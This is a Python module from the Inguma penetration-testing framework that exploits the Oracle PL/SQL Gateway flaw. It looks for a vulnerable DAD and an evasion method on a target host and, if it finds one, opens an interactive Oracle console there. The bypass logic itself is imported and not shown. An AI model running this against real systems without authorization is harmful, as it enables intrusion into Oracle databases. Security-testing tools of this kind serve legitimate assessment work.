##      COraPlsqlGateway.py
#
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

"""
Module Oracle PL/SQL Gateway exploit for Inguma
"""

from lib.module import CIngumaExploitModule
from lib.libvulnoas import getVulnerableDad

name = "oragateway"
brief_description = "An exploit for the Oracle PL/SQL Gateway flaw"
type = "exploit"

globals = ["dad", "method"]

class COraPlsqlGateway(CIngumaExploitModule):

    port = ""
    timeout = 0
    ssl = False
    dad = None
    method = None

    def help(self):
        """ This is the entry point for info <module> """
        self.gom.echo("target = <target host or network>")
        self.gom.echo("port = <target port>")
        self.gom.echo("ssl = <use ssl>")
        self.gom.echo("timeout = <timeout>")

    def runExploit(self):
        ret = getVulnerableDad(self.target, self.port, self.timeout, self.ssl, 1) #Return type 1, return the DAD and the Method

        if not ret:
            self.gom.echo("[!] No suitable PL/SQL gateway evasion method found :(")
            return False

        if ret:
            self.dad = ret[0]
            self.method = ret[1]
            self.gom.echo("[i] Available DAD %s, available method %s" % (self.dad, self.method))

            self.runCommand("oratool", {"console":True, "dad":self.dad, "method":self.method, "ssl":self.ssl})

        return False

    def run(self):
        if self.target == "" or self.target == None:
            self.gom.echo("No target specified")
            return False

        if self.port == 0 or self.port == None:
            self.gom.echo("[!] Warning! No port specified, using default port 80")
            self.port = 80

        return self.runExploit()
